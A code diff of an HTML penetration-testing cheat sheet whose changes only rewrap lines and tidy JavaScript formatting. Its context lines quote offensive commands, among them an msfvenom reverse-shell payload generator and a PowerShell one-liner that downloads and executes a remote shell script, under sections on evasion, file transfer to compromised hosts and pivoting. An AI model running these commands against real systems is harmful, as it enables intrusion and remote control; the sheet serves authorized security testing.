                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Decompilation of APKs, dynamic runtime analysis (Frida), and firmware extraction.</p>
+                    <p class="section-desc">Decompilation of APKs, dynamic runtime analysis (Frida), and firmware
+                        extraction.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -1046,15 +1133,18 @@ strings firmware.bin | grep -i password
                     <h2 class="section-title">
                         <span style="color: var(--text-muted); margin-right: 8px;">17.</span> Safe PoC Testing & Logging
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Techniques for safe, reproducible testing environments and comprehensive logging.</p>
+                    <p class="section-desc">Techniques for safe, reproducible testing environments and comprehensive
+                        logging.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -1080,9 +1170,11 @@ ffuf -u https://example.com/FUZZ -w /wordlist.txt -o ffuf.json -of json
             <div class="section-card" id="section-18">
                 <div class="section-header">
                     <h2 class="section-title">
-                        <span style="color: var(--text-muted); margin-right: 8px;">18.</span> Evasion & msfvenom Payloads
+                        <span style="color: var(--text-muted); margin-right: 8px;">18.</span> Evasion & msfvenom
+                        Payloads
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
@@ -1090,7 +1182,8 @@ ffuf -u https://example.com/FUZZ -w /wordlist.txt -o ffuf.json -of json
                     <p class="section-desc">Generating and encoding reverse shell payloads. AUTHORIZED USE ONLY.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -1112,17 +1205,21 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f asp &gt
             <div class="section-card" id="section-19">
                 <div class="section-header">
                     <h2 class="section-title">
-                        <span style="color: var(--text-muted); margin-right: 8px;">19.</span> File Transfer (In-Memory & On-Disk)
+                        <span style="color: var(--text-muted); margin-right: 8px;">19.</span> File Transfer (In-Memory &
+                        On-Disk)
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Common methods to transfer files to and from a compromised host (Linux/Windows).</p>
+                    <p class="section-desc">Common methods to transfer files to and from a compromised host
+                        (Linux/Windows).</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -1155,15 +1252,18 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5:8000/shell.ps1')
                     <h2 class="section-title">
                         <span style="color: var(--text-muted); margin-right: 8px;">20.</span> Tunneling & Pivoting
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Establishing network access to otherwise unreachable internal networks from a compromised host (pivoting).</p>
+                    <p class="section-desc">Establishing network access to otherwise unreachable internal networks from
+                        a compromised host (pivoting).</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -1202,15 +1302,15 @@ run
         function highlightSyntax(code) {
             let lines = code.split('\n');
             let highlighted = lines.map(line => {
-                if(line.trim().startsWith('#')) {
+                if (line.trim().startsWith('#')) {
                     return `<span class="comment">${line}</span>`;
-                } else if(line.trim() !== '') {
+                } else if (line.trim() !== '') {
                     // Very basic command highlighting
                     let parts = line.split(' ');
-                    if(parts.length > 0) {
+                    if (parts.length > 0) {
                         parts[0] = `<span class="command">${parts[0]}</span>`;
-                        for(let i=1; i<parts.length; i++) {
-                            if(parts[i].startsWith('-')) {
+                        for (let i = 1; i < parts.length; i++) {
+                            if (parts[i].startsWith('-')) {
                                 parts[i] = `<span class="arg">${parts[i]}</span>`;
                             }
                         }
@@ -1241,7 +1341,7 @@ run
             btn.addEventListener('click', (e) => {
                 const codeBlock = e.target.closest('.code-container').querySelector('code');
                 // Extract raw text without HTML tags for copying
-                const rawText = codeBlock.innerText; 
+                const rawText = codeBlock.innerText;
                 copyToClipboard(btn, rawText);
             });
         });
@@ -1252,13 +1352,13 @@ run
 
         searchInput.addEventListener('input', (e) => {
             const term = e.target.value.toLowerCase();
-            
+
             sections.forEach(section => {
                 const text = section.innerText.toLowerCase();
                 if (text.includes(term)) {
                     section.style.display = 'block';
                     // Automatically uncollapse if it matches search
-                    if(term.length > 0) {
+                    if (term.length > 0) {
                         section.classList.remove('collapsed');
                     }
                 } else {
@@ -1266,7 +1366,7 @@ run
                 }
             });
         });
-        
+
         // Setup collapse functionality
         document.querySelectorAll('.section-header').forEach(header => {
             header.addEventListener('click', () => {
@@ -1277,7 +1377,7 @@ run
 
         // Active navigation highlighting
         const navLinks = document.querySelectorAll('.nav-link');
-        
+
         window.addEventListener('scroll', () => {
             let current = '';
             sections.forEach(section => {
@@ -1296,4 +1396,5 @@ run
         });
     </script>
 </body>
+
 </html>
